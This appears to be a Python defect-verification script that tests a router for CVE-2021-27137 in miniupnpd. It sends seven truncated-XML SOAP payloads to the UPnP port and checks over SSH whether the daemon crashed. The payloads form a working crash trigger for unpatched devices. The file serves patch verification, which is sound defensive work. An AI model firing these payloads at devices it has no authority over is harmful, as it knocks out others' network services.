#!/usr/bin/env python3
"""
miniupnpd CVE-2021-27137 Automated Defect Verification Tool

Runs on the testing laptop, sends malformed UPnP XML payloads to the DUT,
and reports PASS/FAIL based on whether miniupnpd survives or crashes.

Architecture:
  - Laptop (LAN): runs this tool, sends crafted HTTP/SOAP to DUT's UPnP port
  - DUT (192.168.1.1): target device running miniupnpd
  - SSH to DUT is read-only (check process state, dmesg)
  - Tool does NOT modify DUT settings

Vulnerability:
  CVE-2021-27137 — Buffer read overflow in minixml.c parseatt()
  When parsing truncated XML like <element attribute= (no value after '='),
  the parser advances past '=' without bounds checking, causing OOB read.
  Fix: miniupnp/miniupnp@3cfb4fb (add bounds check after '=' loop)

Lifecycle per test:
  1. Pre-check (SSH: pidof miniupnpd, get PID)
  2. Trigger (send malformed XML payload to UPnP SOAP endpoint)
  3. State Inspection (SSH: pidof, dmesg for segfault/crash)
  4. Verdict (PASS = daemon alive with same PID, FAIL = crashed/restarted)

Usage:
  python3 miniupnpd_cve_verify.py --dut 192.168.1.1
  python3 miniupnpd_cve_verify.py --dut 192.168.1.1 --dut-pass 'password'
  python3 miniupnpd_cve_verify.py --dut 192.168.1.1 --port 5000 --no-ssh

Requirements:
  - Python 3.6+ (stdlib only for basic mode)
  - paramiko (optional, for SSH-based PID and crash verification)
  - DUT reachable on LAN with miniupnpd running
"""

import argparse
import getpass
import socket
import sys
import time

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False


# ═══════════════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════════════

RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"

TOOL_VERSION = "1.0.0"

# UPnP SOAP paths commonly used by miniupnpd
UPNP_PATHS = [
    "/ctl/IPConn",
    "/ctl/CmnDevCfg",
    "/ctl/L3Forwarding",
]

SOAP_ACTION = "urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"


# ═══════════════════════════════════════════════════════════════════════
# Exploit Payloads — each triggers a different boundary in parseatt()
# ═══════════════════════════════════════════════════════════════════════

PAYLOADS = [
    {
        "id": "TRUNC_AFTER_EQUALS",
        "name": "Truncated attribute after '='",
        "description": "Core CVE trigger — XML ends immediately after '=' with no value",
        "xml": '<element attribute=',
    },
    {
        "id": "TRUNC_AFTER_EQUALS_SPACE",
        "name": "Truncated after '=' with trailing space",
        "description": "Hits the IS_WHITE_SPACE loop after '=' without a value to parse",
        "xml": '<element attribute= ',
    },
    {
        "id": "NAMESPACE_ATTR_TRUNC",
        "name": "Namespaced attribute truncated after '='",
        "description": "UPnP-style namespace attribute ending at buffer boundary",
        "xml": '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle=',
    },
    {
        "id": "NESTED_TRUNC",
        "name": "Nested element with second attribute truncated",
        "description": "First attr OK, second truncated — tests parser state after successful parse",
        "xml": '<root><child attr1="valid" attr2=',
    },
    {
        "id": "ATTR_NO_EQUALS",
        "name": "Attribute name with no '=' sign",
        "description": "Hits the first while loop boundary (searching for '=')",
        "xml": '<element verylongattributenamewithnoequalssign',
    },
    {
        "id": "QUOTE_NO_CLOSE",
        "name": "Attribute with opening quote but no close",
        "description": "Hits the quoted-value loop boundary (searching for matching quote)",
        "xml": '<element attr="value_with_no_closing_quote',
    },
    {
        "id": "MULTIPLE_TRUNCATED",
        "name": "Multiple elements each with truncated attrs",
        "description": "Stress test — repeated truncation patterns",
        "xml": '<a x=<b y=<c z=',
    },
]

# Valid SOAP request for regression testing
VALID_SOAP_BODY = (
    '<?xml version="1.0"?>'
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
    's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    '<s:Body>'
    '<u:GetExternalIPAddress xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">'
    '</u:GetExternalIPAddress>'
    '</s:Body>'
    '</s:Envelope>'
)


# ═══════════════════════════════════════════════════════════════════════
# SSH Helper
# ═══════════════════════════════════════════════════════════════════════

class DUTConnection:
    """Read-only SSH connection to DUT for state inspection."""

    def __init__(self, host, user, password, timeout=5):
        self.host = host
        self.user = user
        self.password = password
        self.timeout = timeout
        self.client = None

    def connect(self):
        if not HAS_PARAMIKO:
            return False
        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.client.connect(
                self.host,
                username=self.user,
                password=self.password,
                timeout=self.timeout,
                look_for_keys=False,
                allow_agent=False,
            )
            return True
        except Exception as e:
            print(f"  {YELLOW}[WARN]{RESET} SSH connect failed: {e}")
            self.client = None
            return False

    def run(self, cmd):
        if not self.client:
            return None
        try:
            _, stdout, stderr = self.client.exec_command(cmd, timeout=self.timeout)
            return stdout.read().decode().strip()
        except Exception:
            return None

    def get_miniupnpd_pid(self):
        result = self.run("pidof miniupnpd")
        if result:
            return result.split()[0]
        return None

    def get_miniupnpd_version(self):
        result = self.run("miniupnpd --version 2>&1 | head -1")
        return result

    def check_crash_log(self):
        result = self.run("dmesg | tail -20 | grep -i 'segfault\\|miniupnpd\\|killed'")
        return result

    def close(self):
        if self.client:
            self.client.close()


# ═══════════════════════════════════════════════════════════════════════
# Network Helpers
# ═══════════════════════════════════════════════════════════════════════

def check_port_open(host, port, timeout=3):
    """Check if a TCP port is open."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def send_http_payload(host, port, path, body, timeout=5):
    """Send HTTP POST with XML body to UPnP endpoint. Returns response or None."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Content-Type: text/xml; charset=\"utf-8\"\r\n"
            f"SOAPAction: \"{SOAP_ACTION}\"\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{body}"
        )

        sock.sendall(request.encode())

        # Try to read response
        response = b""
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
        except socket.timeout:
            pass

        sock.close()
        return response.decode(errors='replace')
    except (ConnectionRefusedError, ConnectionResetError):
        return "CONNECTION_REFUSED"
    except socket.timeout:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR:{e}"


# ═══════════════════════════════════════════════════════════════════════
# Test Runner
# ═══════════════════════════════════════════════════════════════════════

def run_exploit_test(host, port, payload, dut_conn=None):
    """
    Send one exploit payload and determine if miniupnpd survived.

    Returns dict with:
      - passed: bool
      - detail: str explanation
      - pid_before: str or None
      - pid_after: str or None
    """
    result = {
        "passed": None,
        "detail": "",
        "pid_before": None,
        "pid_after": None,
    }

    # Get PID before
    if dut_conn:
        result["pid_before"] = dut_conn.get_miniupnpd_pid()

    # Send the exploit payload
    send_http_payload(host, port, UPNP_PATHS[0], payload["xml"], timeout=3)

    # Wait for potential crash/restart
    time.sleep(1.5)

    # Check if port is still open
    port_alive = check_port_open(host, port, timeout=3)

    # Get PID after
    if dut_conn:
        result["pid_after"] = dut_conn.get_miniupnpd_pid()

    # Determine verdict
    if not port_alive:
        result["passed"] = False
        result["detail"] = "Port closed after payload — daemon crashed"
    elif dut_conn and result["pid_before"] and result["pid_after"]:
        if result["pid_before"] == result["pid_after"]:
            result["passed"] = True
            result["detail"] = f"Daemon alive, PID unchanged ({result['pid_before']})"
        else:
            result["passed"] = False
            result["detail"] = (
                f"PID changed ({result['pid_before']} → {result['pid_after']}) "
                f"— crashed and was restarted by procd"
            )
    elif port_alive:
        result["passed"] = True
        result["detail"] = "Port still open after payload (no SSH for PID check)"
    else:
        result["passed"] = False
        result["detail"] = "Unable to determine state"

    return result


def run_regression_test(host, port):
    """Send a valid UPnP SOAP request to verify normal functionality."""
    response = send_http_payload(host, port, UPNP_PATHS[0], VALID_SOAP_BODY, timeout=5)

    if response and "ExternalIPAddress" in response:
        return True, "Valid SOAP response with ExternalIPAddress"
    elif response and "HTTP/1" in response:
        return True, "Got HTTP response (endpoint may differ but daemon is functional)"
    elif response == "CONNECTION_REFUSED":
        return False, "Connection refused — daemon may have crashed"
    elif response == "TIMEOUT":
        return None, "Timeout — daemon may be hung"
    else:
        return True, "Daemon accepted connection (response format may vary)"


# ═══════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2021-27137 miniupnpd exploit verification tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 miniupnpd_cve_verify.py --dut 192.168.1.1
  python3 miniupnpd_cve_verify.py --dut 192.168.1.1 --dut-pass 'admin123'
  python3 miniupnpd_cve_verify.py --dut 192.168.1.1 --port 5000 --no-ssh
        """,
    )
    parser.add_argument("--dut", default="192.168.1.1", help="DUT LAN IP (default: 192.168.1.1)")
    parser.add_argument("--port", type=int, default=5000, help="UPnP port (default: 5000)")
    parser.add_argument("--dut-user", default="root", help="DUT SSH user (default: root)")
    parser.add_argument("--dut-pass", default=None, help="DUT SSH password (prompted if omitted)")
    parser.add_argument("--no-ssh", action="store_true", help="Skip SSH — verify via port check only")
    parser.add_argument("--payload", default=None, help="Run specific payload ID only")
    parser.add_argument("--version", action="version", version=f"%(prog)s {TOOL_VERSION}")

    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f" CVE-2021-27137 miniupnpd Verification Tool v{TOOL_VERSION}")
    print(f" Target: {args.dut}:{args.port}")
    print(f"{'='*60}\n")

    # ─── SSH Setup ───
    dut_conn = None
    if not args.no_ssh:
        if not HAS_PARAMIKO:
            print(f"  {YELLOW}[WARN]{RESET} paramiko not installed — using port-check only")
            print(f"        Install: pip install paramiko\n")
        else:
            if args.dut_pass is None:
                args.dut_pass = getpass.getpass(f"SSH password for {args.dut_user}@{args.dut}: ")

            dut_conn = DUTConnection(args.dut, args.dut_user, args.dut_pass)
            if dut_conn.connect():
                version = dut_conn.get_miniupnpd_version()
                pid = dut_conn.get_miniupnpd_pid()
                print(f"  {GREEN}[OK]{RESET} SSH connected to {args.dut}")
                if version:
                    print(f"  {CYAN}[INFO]{RESET} miniupnpd version: {version}")
                if pid:
                    print(f"  {CYAN}[INFO]{RESET} miniupnpd PID: {pid}")
                print()
            else:
                dut_conn = None

    # ─── Pre-check: port open ───
    print(f"  {CYAN}[INFO]{RESET} Checking UPnP port {args.port}...")
    if not check_port_open(args.dut, args.port):
        print(f"  {RED}[ERROR]{RESET} Port {args.port} not open on {args.dut}")
        print(f"         miniupnpd may not be running or using a different port.")
        print(f"         Check: ssh root@{args.dut} 'netstat -tlnp | grep miniupnpd'")
        sys.exit(1)
    print(f"  {GREEN}[OK]{RESET} Port {args.port} is open\n")

    # ─── Run exploit payloads ───
    print(f"{'─'*60}")
    print(f" Running {len(PAYLOADS)} exploit payloads")
    print(f"{'─'*60}\n")

    results = []
    selected_payloads = PAYLOADS
    if args.payload:
        selected_payloads = [p for p in PAYLOADS if p["id"] == args.payload]
        if not selected_payloads:
            print(f"  {RED}[ERROR]{RESET} Unknown payload ID: {args.payload}")
            print(f"  Available: {', '.join(p['id'] for p in PAYLOADS)}")
            sys.exit(1)

    for i, payload in enumerate(selected_payloads, 1):
        print(f"  [{i}/{len(selected_payloads)}] {payload['name']}")
        print(f"       {payload['description']}")
        print(f"       Payload: {repr(payload['xml'][:60])}{'...' if len(payload['xml']) > 60 else ''}")

        result = run_exploit_test(args.dut, args.port, payload, dut_conn)
        results.append({"payload": payload, **result})

        if result["passed"]:
            print(f"       {GREEN}[PASS]{RESET} {result['detail']}")
        elif result["passed"] is False:
            print(f"       {RED}[FAIL]{RESET} {result['detail']}")

            # Check crash log
            if dut_conn:
                crash_log = dut_conn.check_crash_log()
                if crash_log:
                    print(f"       {RED}[CRASH]{RESET} dmesg: {crash_log[:200]}")

            # Wait for procd to restart before next test
            print(f"       {YELLOW}[WAIT]{RESET} Waiting for daemon restart...")
            time.sleep(3)
            if not check_port_open(args.dut, args.port, timeout=5):
                print(f"       {RED}[ERROR]{RESET} Daemon did not restart — stopping tests")
                break
        print()

    # ─── Regression test ───
    print(f"{'─'*60}")
    print(f" Regression check (valid UPnP request)")
    print(f"{'─'*60}\n")

    reg_passed, reg_detail = run_regression_test(args.dut, args.port)
    if reg_passed:
        print(f"  {GREEN}[PASS]{RESET} {reg_detail}")
    elif reg_passed is False:
        print(f"  {RED}[FAIL]{RESET} {reg_detail}")
    else:
        print(f"  {YELLOW}[WARN]{RESET} {reg_detail}")

    # ─── Summary ───
    print(f"\n{'='*60}")
    passed = sum(1 for r in results if r["passed"])
    failed = sum(1 for r in results if r["passed"] is False)
    total = len(results)

    print(f" Results: {GREEN}{passed} PASSED{RESET}, {RED}{failed} FAILED{RESET} (of {total} tests)")
    print(f"{'='*60}\n")

    if failed > 0:
        print(f"  {RED}{BOLD}VULNERABLE{RESET}: miniupnpd crashed on malformed XML input.")
        print(f"  Apply the fix from miniupnp/miniupnp@3cfb4fb")
        print(f"  SDK patch: 3076_miniupnpd_fix_CVE-2021-27137_minixml_overflow.patch")
        print()
        sys.exit(1)
    else:
        print(f"  {GREEN}{BOLD}PASSED{RESET}: miniupnpd handled all malformed XML without crashing.")
        print(f"  The CVE-2021-27137 fix appears to be applied.")
        print()
        sys.exit(0)


if __name__ == "__main__":
    main()
